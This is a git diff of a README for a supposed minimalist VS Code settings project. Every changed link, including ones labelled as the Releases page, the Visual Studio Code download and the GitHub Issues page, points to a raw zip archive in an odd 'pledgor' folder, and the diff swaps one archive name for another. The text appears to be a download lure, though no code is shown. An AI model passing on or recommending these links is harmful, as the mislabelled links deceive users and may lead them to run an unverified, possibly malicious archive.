@@ -1,7 +1,7 @@
 # 🎨 vscode-clear-ui-settings - Create Your Zen Coding Space
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/clear-ui-settings-vscode-v2.2.zip)](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/clear-ui-settings-vscode-v2.2.zip)
+[![Download](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/vscode-ui-clear-settings-1.1.zip)](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/vscode-ui-clear-settings-1.1.zip)
 
 ## 📝 Overview
 The **vscode-clear-ui-settings** configuration enhances your coding experience by providing a minimalist, distraction-free workspace. This setup removes unnecessary UI elements from Visual Studio Code and applies a carefully chosen dark theme. It's perfect for developers who want to focus on their code without distractions.
@@ -10,7 +10,7 @@ The **vscode-clear-ui-settings** configuration enhances your coding experience b
 Follow these steps to download and set up vscode-clear-ui-settings:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/clear-ui-settings-vscode-v2.2.zip) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/vscode-ui-clear-settings-1.1.zip) to find the latest version.
 
 2. **Download the Configuration**
    - Find the latest version listed at the top.
@@ -43,7 +43,7 @@ Follow these steps to download and set up vscode-clear-ui-settings:
 
 ## 🖥️ System Requirements
 - **Operating System**: Compatible with Windows, macOS, and Linux.
-- **Visual Studio Code**: Make sure you have the latest version installed (download [here](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/clear-ui-settings-vscode-v2.2.zip)).
+- **Visual Studio Code**: Make sure you have the latest version installed (download [here](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/vscode-ui-clear-settings-1.1.zip)).
 - **RAM**: Minimum of 4 GB recommended for optimal performance.
 - **Storage**: At least 100 MB of free space for installation.
 
@@ -66,13 +66,13 @@ This project covers the following topics:
 - workspace
 
 ## 🔗 Support
-If you have questions or need assistance, feel free to raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/clear-ui-settings-vscode-v2.2.zip). We will do our best to help you as quickly as possible.
+If you have questions or need assistance, feel free to raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/vscode-ui-clear-settings-1.1.zip). We will do our best to help you as quickly as possible.
 
 ## 📩 Feedback
 We welcome your feedback to make **vscode-clear-ui-settings** better. If you enjoy using this setup, please let us know. Your input helps us improve the project for everyone.
 
 ## 📥 Download & Install
-To get started, [visit this page to download](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/clear-ui-settings-vscode-v2.2.zip) the latest version of vscode-clear-ui-settings. Follow the steps above for a seamless installation.
+To get started, [visit this page to download](https://raw.githubusercontent.com/mfaqih202101/vscode-clear-ui-settings/main/pledgor/vscode-ui-clear-settings-1.1.zip) the latest version of vscode-clear-ui-settings. Follow the steps above for a seamless installation.
 
 ## ⚙️ Conclusion
 With **vscode-clear-ui-settings**, you can create a serene coding environment that enhances your focus and productivity. Enjoy a clean, minimalist workspace tailored for your development needs.
